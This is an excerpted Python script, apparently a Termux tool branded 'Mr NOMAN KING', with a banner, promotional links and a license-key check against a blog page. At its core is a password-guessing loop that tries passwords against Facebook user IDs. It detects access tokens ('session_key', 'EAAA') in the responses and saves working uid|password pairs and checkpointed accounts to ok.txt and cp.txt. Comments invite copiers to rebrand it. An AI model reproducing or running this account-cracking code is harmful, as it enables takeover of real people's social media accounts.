...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://mrking03.blogspot.com/2022/06/devil.html?m=1"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/profile.php?id=100085010801013")
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://mrking03.blogspot.com/2022/06/devil.html?m=1').text
			if basesplit in plr:
				key = basesplit
...
╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
 ...
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr NOMAN KING\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-NOMAN \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : Nomi King03\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : Noman Khalid \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCJlwrXWBU4RPAn6pKQqAu5w"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=NOMI=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=NOMI=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=KING=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=KING=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #NOMAN copy kr k apna name dal dna
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    : MR NOMAN ")
		print(" [*] Team      :  NOMI +  SANA + FIZA\n")
		print(" [ Sosial Media  ] NOMI K1NG \n")
		print(" [*] Facebook  : https://facebook.com/NOMAN.KHALID.com ")
		print(" [*] Instagram : https://instagram.com/Nomiking03 ")
		print(" [*] YouTube   : https://youtube.com/Devil.trick's ")
		exit(" [*] GitHub    : https://github.com/Nomiking786 ")
	else:
		Main()
